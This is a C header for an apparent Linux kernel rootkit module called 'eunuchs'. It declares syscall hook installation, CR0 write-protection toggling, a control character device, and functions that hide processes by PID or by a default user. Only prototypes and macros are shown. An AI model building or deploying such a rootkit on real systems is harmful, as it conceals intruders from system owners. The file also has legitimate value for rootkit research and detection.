#ifndef EUNUCHS_H
#define EUNUCHS_H

#define DEBUG 1
#define debug(fmt, ...) \
    if(DEBUG) \
    { \
        printk("[eunuchs] [%s] " fmt, __func__, ##__VA_ARGS__); \
    }

/* hide processes owned by this user by default */
#define EUNUCHS_PROC_HIDE_DEFAULT_USER "eunuchs"

/* for our char block device */
#define EUNUCHS_DEVICE_NAME "eunuchs"
#define EUNUCHS_CLASS_NAME "eunuchs"

extern int eunuchs_init(void);
extern void eunuchs_exit(void);
extern int eunuchs_hooks_install(void);
extern void eunuchs_hooks_remove(void);
extern void cr0_enable_write(void);
extern void cr0_disable_write(void);
extern int eunuchs_dev_init(void);
extern int eunuchs_dev_remove(void);
extern int hide_proc_by_pid(char *);
extern int show_proc_by_pid(char *);
extern int eunuchs_lists_show_all(void);

#endif
